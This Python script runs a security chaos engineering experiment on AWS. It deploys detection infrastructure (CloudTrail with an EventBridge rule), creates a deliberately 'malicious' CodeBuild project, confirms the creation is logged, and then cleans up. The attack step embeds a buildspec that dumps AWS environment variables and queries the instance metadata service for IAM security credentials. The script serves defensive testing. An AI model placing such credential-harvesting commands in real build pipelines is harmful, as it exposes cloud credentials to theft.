"""
Security Chaos Engineering Experiment: Detect Malicious CodeBuild Project Creation

This experiment validates that detective controls can detect the creation of 
malicious CodeBuild projects, which could be used to harvest AWS credentials
from the instance metadata service.

Attack Node: 1.2 Create Malicious CodeBuild Project
Defense: CloudTrail logging with EventBridge rules for real-time detection
Probe Type: Detective - verifies logging captures suspicious project setup
"""

import json
import logging
import time
import boto3
from botocore.exceptions import ClientError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Global state for experiment tracking
EXPERIMENT_STATE = {
    'stack_name': None,
    'stack_suffix': None,
    'codebuild_project_name': None,
    'region': None,
    'account_id': None,
    'log_group_name': None,
    'attack_timestamp': None
}


def get_aws_clients():
    """Initialize AWS clients with proper error handling."""
    session = boto3.Session()
    region = session.region_name or 'us-east-1'
    
    clients = {
        'cloudformation': boto3.client('cloudformation', region_name=region),
        'codebuild': boto3.client('codebuild', region_name=region),
        'iam': boto3.client('iam', region_name=region),
        'sts': boto3.client('sts', region_name=region),
        'logs': boto3.client('logs', region_name=region),
        'cloudtrail': boto3.client('cloudtrail', region_name=region),
        'events': boto3.client('events', region_name=region)
    }
    
    # Get account info
    identity = clients['sts'].get_caller_identity()
    account_id = identity['Account']
    
    logger.info(f"Using AWS Account: {account_id}, Region: {region}")
    
    EXPERIMENT_STATE['region'] = region
    EXPERIMENT_STATE['account_id'] = account_id
    
    return clients, region, account_id


def get_cloudformation_template(suffix, account_id, region):
    """Generate CloudFormation template for detection infrastructure."""
    log_group_name = f"/aws/events/codebuild-detection-{suffix}"
    EXPERIMENT_STATE['log_group_name'] = log_group_name
    
    template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "Detection infrastructure for malicious CodeBuild project creation",
        "Resources": {
            # CloudWatch Log Group for detection events
            "DetectionLogGroup": {
                "Type": "AWS::Logs::LogGroup",
                "Properties": {
                    "LogGroupName": log_group_name,
                    "RetentionInDays": 1,
                    "Tags": [
                        {"Key": "Experiment", "Value": f"sce-codebuild-{suffix}"},
                        {"Key": "Purpose", "Value": "security-chaos-engineering"}
                    ]
                }
            },
            # IAM Role for CodeBuild (needed for the attack)
            "CodeBuildServiceRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-codebuild-role-{suffix}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "codebuild.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    },
                    "ManagedPolicyArns": [
                        "arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"
                    ],
                    "Tags": [
                        {"Key": "Experiment", "Value": f"sce-codebuild-{suffix}"}
                    ]
                }
            },
            # EventBridge Rule for CodeBuild CreateProject detection
            "CodeBuildDetectionRule": {
                "Type": "AWS::Events::Rule",
                "DependsOn": "DetectionLogGroup",
                "Properties": {
                    "Name": f"detect-codebuild-create-{suffix}",
                    "Description": "Detect CodeBuild project creation events",
                    "State": "ENABLED",
                    "EventPattern": {
                        "source": ["aws.codebuild"],
                        "detail-type": ["AWS API Call via CloudTrail"],
                        "detail": {
                            "eventSource": ["codebuild.amazonaws.com"],
                            "eventName": ["CreateProject"]
                        }
                    },
                    "Targets": [
                        {
                            "Id": "LogGroupTarget",
                            "Arn": f"arn:aws:logs:{region}:{account_id}:log-group:{log_group_name}"
                        }
                    ]
                }
            },
            # Resource policy for CloudWatch Logs to receive EventBridge events
            "LogGroupPolicy": {
                "Type": "AWS::Logs::ResourcePolicy",
                "DependsOn": "DetectionLogGroup",
                "Properties": {
                    "PolicyName": f"eventbridge-logs-policy-{suffix}",
                    "PolicyDocument": json.dumps({
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "events.amazonaws.com"
                                },
                                "Action": [
                                    "logs:CreateLogStream",
                                    "logs:PutLogEvents"
                                ],
                                "Resource": f"arn:aws:logs:{region}:{account_id}:log-group:{log_group_name}:*"
                            }
                        ]
                    })
                }
            }
        },
        "Outputs": {
            "LogGroupName": {
                "Description": "CloudWatch Log Group for detection events",
                "Value": {"Ref": "DetectionLogGroup"},
                "Export": {"Name": f"sce-detection-loggroup-{suffix}"}
            },
            "CodeBuildRoleArn": {
                "Description": "IAM Role ARN for CodeBuild",
                "Value": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]},
                "Export": {"Name": f"sce-codebuild-role-{suffix}"}
            },
            "DetectionRuleName": {
                "Description": "EventBridge rule name for detection",
                "Value": {"Ref": "CodeBuildDetectionRule"},
                "Export": {"Name": f"sce-detection-rule-{suffix}"}
            }
        }
    }
    
    return json.dumps(template)


def wait_for_stack(cf_client, stack_name, target_status, timeout=300):
    """Wait for CloudFormation stack to reach target status."""
    start_time = time.monotonic()
    last_status = None
    
    while time.monotonic() - start_time < timeout:
        try:
            response = cf_client.describe_stacks(StackName=stack_name)
            if not response['Stacks']:
                if target_status == 'DELETE_COMPLETE':
                    logger.info(f"Stack {stack_name} deleted successfully")
                    return True
                logger.error(f"Stack {stack_name} not found")
                return False
            
            status = response['Stacks'][0]['StackStatus']
            
            if status != last_status:
                logger.info(f"Stack status: {status}")
                last_status = status
            
            if status == target_status:
                return True
            
            if 'FAILED' in status or 'ROLLBACK' in status:
                # Get stack events for debugging
                try:
                    events = cf_client.describe_stack_events(StackName=stack_name)
                    for event in events['StackEvents'][:10]:
                        if 'FAILED' in event.get('ResourceStatus', ''):
                            logger.error(f"Failed resource: {event.get('LogicalResourceId')} - {event.get('ResourceStatusReason', 'No reason')}")
                except Exception as e:
                    logger.error(f"Could not get stack events: {e}")
                return False
            
            if status == 'DELETE_IN_PROGRESS' and target_status != 'DELETE_COMPLETE':
                logger.error("Stack is being deleted unexpectedly")
                # Get stack events for debugging
                try:
                    events = cf_client.describe_stack_events(StackName=stack_name)
                    for event in events['StackEvents'][:10]:
                        reason = event.get('ResourceStatusReason', '')
                        if reason:
                            logger.error(f"Resource: {event.get('LogicalResourceId')} - Status: {event.get('ResourceStatus')} - Reason: {reason}")
                except Exception as e:
                    logger.error(f"Could not get stack events: {e}")
                return False
                
        except ClientError as e:
            if 'does not exist' in str(e):
                if target_status == 'DELETE_COMPLETE':
                    return True
                return False
            logger.error(f"Error checking stack status: {e}")
        
        time.sleep(10)
    
    logger.error(f"Timeout waiting for stack to reach {target_status}")
    return False


def steady_state() -> dict:
    """Deploy detection infrastructure for the experiment."""
    suffix = str(int(time.time()))
    stack_name = f"sce-codebuild-detect-{suffix}"
    
    EXPERIMENT_STATE['stack_name'] = stack_name
    EXPERIMENT_STATE['stack_suffix'] = suffix
    EXPERIMENT_STATE['codebuild_project_name'] = f"malicious-project-{suffix}"
    
    logger.info(f"Starting steady_state with stack: {stack_name}")
    
    try:
        clients, region, account_id = get_aws_clients()
        cf_client = clients['cloudformation']
        
        # Check if stack already exists
        try:
            existing = cf_client.describe_stacks(StackName=stack_name)
            if existing['Stacks']:
                status = existing['Stacks'][0]['StackStatus']
                logger.warning(f"Stack {stack_name} already exists with status: {status}")
                if status == 'CREATE_COMPLETE':
                    return {'stack_name': stack_name, 'status': 'exists'}
                elif 'IN_PROGRESS' in status:
                    if wait_for_stack(cf_client, stack_name, 'CREATE_COMPLETE', timeout=300):
                        return {'stack_name': stack_name, 'status': 'created'}
        except ClientError as e:
            if 'does not exist' not in str(e):
                raise
        
        # Create the stack
        template_body = get_cloudformation_template(suffix, account_id, region)
        
        logger.info(f"Creating CloudFormation stack: {stack_name}")
        
        response = cf_client.create_stack(
            StackName=stack_name,
            TemplateBody=template_body,
            Capabilities=['CAPABILITY_NAMED_IAM'],
            Tags=[
                {'Key': 'Experiment', 'Value': f'sce-codebuild-{suffix}'},
                {'Key': 'Purpose', 'Value': 'security-chaos-engineering'},
                {'Key': 'AutoDelete', 'Value': 'true'}
            ],
            OnFailure='DELETE'
        )
        
        stack_id = response['StackId']
        logger.info(f"Stack creation initiated: {stack_id}")
        
        # Wait for stack creation
        if not wait_for_stack(cf_client, stack_name, 'CREATE_COMPLETE', timeout=300):
            logger.error("Stack creation failed")
            return {'stack_name': stack_name, 'status': 'failed'}
        
        # Get stack outputs
        outputs_response = cf_client.describe_stacks(StackName=stack_name)
        outputs = {}
        for output in outputs_response['Stacks'][0].get('Outputs', []):
            outputs[output['OutputKey']] = output['OutputValue']
        
        logger.info(f"Stack outputs: {outputs}")
        EXPERIMENT_STATE['stack_outputs'] = outputs
        
        # Wait for EventBridge rule to be active
        time.sleep(10)
        
        return {
            'stack_name': stack_name,
            'status': 'created',
            'outputs': outputs
        }
        
    except Exception as e:
        logger.error(f"Error in steady_state: {e}")
        return {'stack_name': stack_name, 'status': 'error', 'error': str(e)}


def attack() -> bool:
    """Execute the attack: create a malicious CodeBuild project."""
    logger.info("Executing attack: Creating malicious CodeBuild project")
    
    try:
        clients, region, account_id = get_aws_clients()
        codebuild_client = clients['codebuild']
        cf_client = clients['cloudformation']
        
        stack_name = EXPERIMENT_STATE.get('stack_name')
        if not stack_name:
            logger.error("No stack name found in experiment state")
            return False
        
        # Get the IAM role ARN from stack outputs
        try:
            response = cf_client.describe_stacks(StackName=stack_name)
            outputs = {o['OutputKey']: o['OutputValue'] for o in response['Stacks'][0].get('Outputs', [])}
            role_arn = outputs.get('CodeBuildRoleArn')
            
            if not role_arn:
                logger.error("Could not find CodeBuild role ARN in stack outputs")
                return False
                
            logger.info(f"Using CodeBuild role: {role_arn}")
            
        except ClientError as e:
            logger.error(f"Failed to get stack outputs: {e}")
            return False
        
        # Record attack timestamp for verification
        EXPERIMENT_STATE['attack_timestamp'] = time.time()
        
        project_name = EXPERIMENT_STATE['codebuild_project_name']
        
        # Create malicious buildspec that attempts credential harvesting
        malicious_buildspec = """version: 0.2
phases:
  build:
    commands:
      - echo "Attempting credential harvesting..."
      - env | grep -i aws || true
      - curl -s http://169.254.169.254/latest/meta-data/ || true
      - curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true
      - echo "Credential harvesting attempt complete"
"""
        
        # Create the malicious CodeBuild project
        logger.info(f"Creating malicious CodeBuild project: {project_name}")
        
        response = codebuild_client.create_project(
            name=project_name,
            description="Malicious project for credential harvesting - SCE Experiment",
            source={
                'type': 'NO_SOURCE',
                'buildspec': malicious_buildspec
            },
            artifacts={
                'type': 'NO_ARTIFACTS'
            },
            environment={
                'type': 'LINUX_CONTAINER',
                'image': 'aws/codebuild/amazonlinux2-x86_64-standard:4.0',
                'computeType': 'BUILD_GENERAL1_SMALL',
                'environmentVariables': [
                    {
                        'name': 'MALICIOUS_FLAG',
                        'value': 'credential_harvesting',
                        'type': 'PLAINTEXT'
                    }
                ]
            },
            serviceRole=role_arn,
            tags=[
                {'key': 'Experiment', 'value': f"sce-codebuild-{EXPERIMENT_STATE['stack_suffix']}"},
                {'key': 'Purpose', 'value': 'security-chaos-engineering'},
                {'key': 'Malicious', 'value': 'true'}
            ]
        )
        
        project_arn = response['project']['arn']
        logger.info(f"Successfully created malicious CodeBuild project: {project_arn}")
        EXPERIMENT_STATE['codebuild_project_arn'] = project_arn
        
        # Wait for CloudTrail to record the event and EventBridge to process it
        logger.info("Waiting for event propagation (60 seconds)...")
        time.sleep(60)
        
        return True
        
    except ClientError as e:
        logger.error(f"Failed to create CodeBuild project: {e}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error in attack: {e}")
        return False


def hypothesis_verification() -> bool:
    """Verify that detective controls detected the malicious CodeBuild project creation."""
    logger.info("Starting hypothesis verification")
    
    try:
        clients, region, account_id = get_aws_clients()
        logs_client = clients['logs']
        events_client = clients['events']
        cloudtrail_client = clients['cloudtrail']
        
        suffix = EXPERIMENT_STATE.get('stack_suffix')
        log_group_name = EXPERIMENT_STATE.get('log_group_name') or f"/aws/events/codebuild-detection-{suffix}"
        project_name = EXPERIMENT_STATE.get('codebuild_project_name')
        attack_time = EXPERIMENT_STATE.get('attack_timestamp', time.time() - 300)
        
        logger.info(f"Looking for detection of project: {project_name}")
        logger.info(f"Checking log group: {log_group_name}")
        
        # First verify EventBridge rule is active
        rule_name = f"detect-codebuild-create-{suffix}"
        try:
            rule_response = events_client.describe_rule(Name=rule_name)
            rule_state = rule_response.get('State', 'UNKNOWN')
            logger.info(f"EventBridge rule state: {rule_state}")
            
            if rule_state != 'ENABLED':
                logger.warning(f"EventBridge rule is not enabled: {rule_state}")
        except ClientError as e:
            logger.warning(f"Could not check EventBridge rule: {e}")
        
        # Check CloudWatch Logs for detection events
        detection_found = False
        max_attempts = 12
        wait_interval = 15
        
        for attempt in range(max_attempts):
            logger.info(f"Checking for detection events (attempt {attempt + 1}/{max_attempts})...")
            
            try:
                # Get log streams
                streams_response = logs_client.describe_log_streams(
                    logGroupName=log_group_name,
                    orderBy='LastEventTime',
                    descending=True,
                    limit=10
                )
                
                log_streams = streams_response.get('logStreams', [])
                
                if not log_streams:
                    logger.info("No log streams found yet")
                else:
                    logger.info(f"Found {len(log_streams)} log streams")
                    
                    for stream in log_streams:
                        stream_name = stream['logStreamName']
                        
                        # Get log events
                        events_response = logs_client.get_log_events(
                            logGroupName=log_group_name,
                            logStreamName=stream_name,
                            startTime=int((attack_time - 60) * 1000),
                            limit=100
                        )
                        
                        for event in events_response.get('events', []):
                            message = event.get('message', '')
                            
                            try:
                                event_data = json.loads(message)
                                
                                # Check for CreateProject event
                                detail = event_data.get('detail', {})
                                event_name = detail.get('eventName', '')
                                event_source = detail.get('eventSource', '')
                                
                                if event_name == 'CreateProject' and 'codebuild' in event_source:
                                    request_params = detail.get('requestParameters', {})
                                    detected_project = request_params.get('name', '')
                                    
                                    logger.info(f"Found CreateProject event for: {detected_project}")
                                    
                                    if project_name and project_name in detected_project:
                                        logger.info("SUCCESS: Detected our malicious CodeBuild project creation!")
                                        detection_found = True
                                        break
                                        
                            except json.JSONDecodeError:
                                continue
                        
                        if detection_found:
                            break
                
            except ClientError as e:
                if 'ResourceNotFoundException' in str(e):
                    logger.info("Log group not found yet, waiting...")
                else:
                    logger.warning(f"Error querying logs: {e}")
            
            if detection_found:
                break
            
            time.sleep(wait_interval)
        
        # If not found in EventBridge logs, check CloudTrail directly as fallback
        if not detection_found:
            logger.info("Checking CloudTrail directly as fallback verification...")
            
            try:
                end_time = time.time()
                start_time = attack_time - 120
                
                response = cloudtrail_client.lookup_events(
                    LookupAttributes=[
                        {
                            'AttributeKey': 'EventName',
                            'AttributeValue': 'CreateProject'
                        }
                    ],
                    StartTime=start_time,
                    EndTime=end_time,
                    MaxResults=50
                )
                
                for event in response.get('Events', []):
                    cloud_trail_event = json.loads(event.get('CloudTrailEvent', '{}'))
                    event_source = cloud_trail_event.get('eventSource', '')
                    
                    if 'codebuild' in event_source:
                        request_params = cloud_trail_event.get('requestParameters', {})
                        detected_project = request_params.get('name', '')
                        
                        logger.info(f"CloudTrail found CreateProject for: {detected_project}")
                        
                        if project_name and project_name in detected_project:
                            logger.info("SUCCESS: CloudTrail captured the malicious CodeBuild project creation!")
                            detection_found = True
                            break
                            
            except ClientError as e:
                logger.warning(f"CloudTrail lookup failed: {e}")
        
        if detection_found:
            logger.info("HYPOTHESIS VERIFIED: Detective controls successfully detected malicious CodeBuild project creation")
            return True
        else:
            logger.warning("HYPOTHESIS FAILED: Detective controls did not detect the malicious CodeBuild project creation within the expected timeframe")
            return False
            
    except Exception as e:
        logger.error(f"Error in hypothesis verification: {e}")
        return False


def rollback() -> dict:
    """Clean up all experiment resources."""
    stack_name = EXPERIMENT_STATE.get('stack_name')
    project_name = EXPERIMENT_STATE.get('codebuild_project_name')
    
    logger.info(f"Starting rollback for stack: {stack_name}")
    
    results = {
        'codebuild_deleted': False,
        'stack_deleted': False,
        'errors': []
    }
    
    try:
        clients, region, account_id = get_aws_clients()
        codebuild_client = clients['codebuild']
        cf_client = clients['cloudformation']
        
        # Delete CodeBuild project first
        if project_name:
            try:
                logger.info(f"Deleting CodeBuild project: {project_name}")
                codebuild_client.delete_project(name=project_name)
                logger.info("CodeBuild project deleted successfully")
                results['codebuild_deleted'] = True
            except ClientError as e:
                if 'ResourceNotFoundException' in str(e):
                    logger.info("CodeBuild project does not exist, skipping")
                    results['codebuild_deleted'] = True
                else:
                    logger.error(f"Error deleting CodeBuild project: {e}")
                    results['errors'].append(str(e))
        
        # Delete CloudFormation stack
        if stack_name:
            try:
                # Check if stack exists
                try:
                    cf_client.describe_stacks(StackName=stack_name)
                    stack_exists = True
                except ClientError as e:
                    if 'does not exist' in str(e):
                        stack_exists = False
                        logger.info(f"Stack {stack_name} does not exist, nothing to delete")
                        results['stack_deleted'] = True
                    else:
                        raise
                
                if stack_exists:
                    logger.info(f"Deleting CloudFormation stack: {stack_name}")
                    cf_client.delete_stack(StackName=stack_name)
                    
                    if wait_for_stack(cf_client, stack_name, 'DELETE_COMPLETE', timeout=300):
                        logger.info("Stack deleted successfully")
                        results['stack_deleted'] = True
                    else:
                        logger.error("Stack deletion timed out")
                        results['errors'].append("Stack deletion timed out")
                        
            except ClientError as e:
                logger.error(f"Error deleting stack: {e}")
                results['errors'].append(str(e))
        
    except Exception as e:
        logger.error(f"Error during rollback: {e}")
        results['errors'].append(str(e))
    
    return results


# Main execution for standalone testing
if __name__ == "__main__":
    logger.info("=" * 60)
    logger.info("Starting SCE Experiment: Detect Malicious CodeBuild Project Creation")
    logger.info("=" * 60)
    
    try:
        # Deploy infrastructure
        logger.info("\n--- STEADY STATE ---")
        steady_result = steady_state()
        logger.info(f"Steady state result: {steady_result}")
        
        if steady_result.get('status') not in ['created', 'exists']:
            logger.error("Steady state failed, aborting experiment")
            rollback()
            exit(1)
        
        # Execute attack
        logger.info("\n--- ATTACK ---")
        attack_result = attack()
        logger.info(f"Attack result: {attack_result}")
        
        # Verify hypothesis
        logger.info("\n--- HYPOTHESIS VERIFICATION ---")
        verification_result = hypothesis_verification()
        logger.info(f"Verification result: {verification_result}")
        
        if verification_result:
            logger.info("\n*** EXPERIMENT PASSED: Detective controls working as expected ***")
        else:
            logger.warning("\n*** EXPERIMENT FAILED: Detective controls did not detect the attack ***")
            
    except Exception as e:
        logger.error(f"Experiment failed with error: {e}")
    finally:
        # Always attempt rollback
        logger.info("\n--- ROLLBACK ---")
        rollback_result = rollback()
        logger.info(f"Rollback result: {rollback_result}")